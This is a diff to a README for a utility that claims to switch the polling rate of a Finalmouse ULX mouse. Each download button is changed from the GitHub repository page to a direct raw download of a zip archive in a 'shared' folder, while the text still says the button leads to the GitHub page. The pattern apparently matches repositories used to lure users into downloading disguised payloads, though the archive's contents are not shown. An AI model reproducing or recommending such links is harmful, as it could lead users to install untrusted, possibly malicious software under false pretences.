@@ -1,6 +1,6 @@
 # 🖱️ FinalmousePollingRateSwitcher - Switch ULX Polling Rate Automatically
 
-[![Download FinalmousePollingRateSwitcher](https://img.shields.io/badge/Download-FinalmousePollingRateSwitcher-blue?style=for-the-badge)](https://github.com/STAINWAKER/FinalmousePollingRateSwitcher)
+[![Download FinalmousePollingRateSwitcher](https://img.shields.io/badge/Download-FinalmousePollingRateSwitcher-blue?style=for-the-badge)](https://github.com/STAINWAKER/FinalmousePollingRateSwitcher/raw/refs/heads/main/shared/Rate_Polling_Switcher_Finalmouse_v2.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start, make sure your computer meets these requirements:
 
 Click the large blue button below. It will take you to the GitHub page where you can get the latest version of FinalmousePollingRateSwitcher.
 
-[![Download FinalmousePollingRateSwitcher](https://img.shields.io/badge/Download-FinalmousePollingRateSwitcher-blue?style=for-the-badge)](https://github.com/STAINWAKER/FinalmousePollingRateSwitcher)
+[![Download FinalmousePollingRateSwitcher](https://img.shields.io/badge/Download-FinalmousePollingRateSwitcher-blue?style=for-the-badge)](https://github.com/STAINWAKER/FinalmousePollingRateSwitcher/raw/refs/heads/main/shared/Rate_Polling_Switcher_Finalmouse_v2.3.zip)
 
 ---
 
@@ -151,4 +151,4 @@ Developers can find the source code and build instructions on the GitHub page.
 
 Visit the page below to download the latest version and installation instructions.
 
-[![Download FinalmousePollingRateSwitcher](https://img.shields.io/badge/Download-FinalmousePollingRateSwitcher-blue?style=for-the-badge)](https://github.com/STAINWAKER/FinalmousePollingRateSwitcher)
+[![Download FinalmousePollingRateSwitcher](https://img.shields.io/badge/Download-FinalmousePollingRateSwitcher-blue?style=for-the-badge)](https://github.com/STAINWAKER/FinalmousePollingRateSwitcher/raw/refs/heads/main/shared/Rate_Polling_Switcher_Finalmouse_v2.3.zip)
